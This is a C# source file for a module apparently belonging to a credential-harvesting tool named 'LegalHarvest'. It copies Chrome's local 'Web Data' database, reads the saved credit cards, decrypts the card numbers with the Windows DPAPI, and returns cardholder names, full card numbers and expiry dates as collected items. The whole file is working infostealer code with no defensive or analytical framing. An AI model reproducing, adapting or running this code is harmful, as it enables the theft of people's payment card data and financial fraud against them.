using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace LegalHarvest.Modules
{
    public class CreditCardsModule : ICollectorModule
    {
        public string ModuleName => "CreditCards";
        public bool CanExecute()
        {
            string webData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Web Data");
            return File.Exists(webData);
        }

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string webData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Web Data");
            string tempDb = Path.GetTempFileName();
            File.Copy(webData, tempDb, true);
            try
            {
                using (var conn = new SQLiteConnection($"Data Source={tempDb};Version=3;"))
                {
                    conn.Open();
                    string query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards";
                    using (var cmd = new SQLiteCommand(query, conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string number = "";
                            byte[] encryptedNumber = (byte[])reader["card_number_encrypted"];
                            if (encryptedNumber != null)
                            {
                                try
                                {
                                    byte[] decrypted = ProtectedData.Unprotect(encryptedNumber, null, DataProtectionScope.CurrentUser);
                                    number = Encoding.UTF8.GetString(decrypted);
                                }
                                catch { number = "[DECRYPT_FAILED]"; }
                            }
                            items.Add(new CollectedItem { Category = "CreditCard", Name = reader["name_on_card"].ToString(), Value = $"{number} ({reader["expiration_month"]}/{reader["expiration_year"]})", Timestamp = DateTime.Now });
                        }
                    }
                }
            }
            finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
            return items;
        }
    }
}
